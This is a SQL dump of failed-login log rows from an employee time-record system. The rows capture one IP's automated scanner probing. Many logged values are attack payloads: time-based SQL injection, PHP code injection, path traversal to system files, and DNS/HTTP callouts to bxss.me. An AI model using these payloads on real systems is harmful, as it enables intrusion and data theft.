INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('448', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: 1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('449', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('450', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: Http://bxss.me/t/fit.txt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('451', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: 0EUlmrcn\'; waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('452', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: )', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('453', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: http://bxss.me/t/fit.txt?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('454', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: !(()&&!|*|*|', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('455', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: /etc/shells', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('456', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: ^(#$!@#$)(()))******', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('457', '', '2023-05-08 03:41:45', '', 'Invalid username/password. Tried with: c:/windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('458', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('459', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('460', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('461', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('462', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('463', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('464', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('465', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('466', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('467', '', '2023-05-08 03:41:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('468', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('469', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('470', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('471', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('472', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('473', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: kAYcYEWw\' OR 763=(SELECT 763 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('474', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('475', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('476', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('477', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('478', '', '2023-05-08 03:41:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('479', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('480', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('481', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: \'.gethostbyname(lc(\'hitfn\'.\'twwiwqax4544c.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(98).chr(73).chr(100).chr(8', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('482', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('483', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: \".gethostbyname(lc(\"hitmk\".\"qmqrartja439d.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(120).chr(89).chr(110).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('484', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('485', '', '2023-05-08 03:41:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('486', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: iVKAQQ7k\') OR 907=(SELECT 907 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('487', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('488', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('489', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('490', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('491', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('492', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('493', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('494', '', '2023-05-08 03:41:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('495', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('496', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: ;assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('497', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: RDFYjolf<esi:include src=\"http://bxss.me/rpb.png\"/>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('498', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: \';print(md5(31337));$a=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('499', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('500', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: xUmhoMiU\')) OR 533=(SELECT 533 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('501', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: \";print(md5(31337));$a=\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('502', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('503', '', '2023-05-08 03:41:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('504', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('505', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('506', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}\\', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('507', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('508', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: \'.print(md5(31337)).\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('509', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: HttP://bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('510', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('511', '', '2023-05-08 03:41:51', '', 'Invalid username/password. Tried with: bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('512', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('513', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('514', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('515', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('516', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('517', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('518', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('519', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('520', '', '2023-05-08 03:41:52', '', 'Invalid username/password. Tried with: 1\'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('521', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('522', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('523', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('524', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: 1%2527%2522', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('525', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('526', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('527', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: @@1xjEw', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('528', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('529', '', '2023-05-08 03:41:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('530', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: \"+\"A\".concat(70-3).concat(22*4).concat(110).concat(73).concat(120).concat(87)+(require\"socket\"\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('531', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('532', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: \'+\'A\'.concat(70-3).concat(22*4).concat(121).concat(75).concat(100).concat(73)+(require\'socket\'\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('533', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('534', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('535', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('536', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('537', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('538', '', '2023-05-08 03:41:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('539', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('540', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('541', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('542', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('543', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('544', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('545', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('546', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('547', '', '2023-05-08 03:41:55', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('548', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('549', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('550', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('551', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('552', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: check_dtr/.', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('553', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('554', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('555', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('556', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('557', '', '2023-05-08 03:41:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('558', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('559', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('560', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('561', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('562', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('563', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('564', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('565', '', '2023-05-08 03:41:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('566', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('567', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('568', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('569', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('570', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('571', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('572', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
